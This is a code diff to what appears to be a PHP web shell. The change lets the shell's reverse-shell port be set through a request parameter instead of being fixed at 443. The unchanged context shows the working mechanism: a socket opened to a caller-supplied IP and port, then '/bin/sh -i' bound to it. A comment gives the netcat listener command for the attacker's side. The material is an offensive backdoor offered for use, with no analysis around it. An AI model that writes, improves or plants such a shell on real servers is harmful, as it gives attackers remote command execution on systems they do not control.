@@ -19,6 +19,16 @@ $this_file = __FILE__;
 // parameter.
 $cmd = 'cmd';
 
+// name  of the  parameter  (GET or  POST)  for the  ip
+// address. change this if  the target already use this
+// parameter.
+$ip = 'ip';
+
+// name of the parameter (GET  or POST) for the port to
+// listen  on. change  this if  the target  already use
+// this parameter.
+$port = 'port';
+
 // test if  parameter 'cmd', 'ip or  'port' is present.
 // if not  this will avoid an  error on logs or  on all
 // pages if badly configured.
@@ -40,13 +50,11 @@ if (isset($_REQUEST[$ip]) && !isset($_REQUEST[$cmd])) {
    $ip = $_REQUEST[$ip];
 
    // default port 443
-   $port = '443';
+   $port = isset($_REQUEST[$port])
+      ? $_REQUEST[$port]
+      : '443';
 
-   if (isset($_REQUEST[$port])) {
-      $port = $_REQUEST[$port];
-   }
-
-   // nc -nlvp 443
+   // nc -nlvp $port
    $sock    = fsockopen($ip, $port);
    $command = '/bin/sh -i <&3 >&3 2>&3';
 
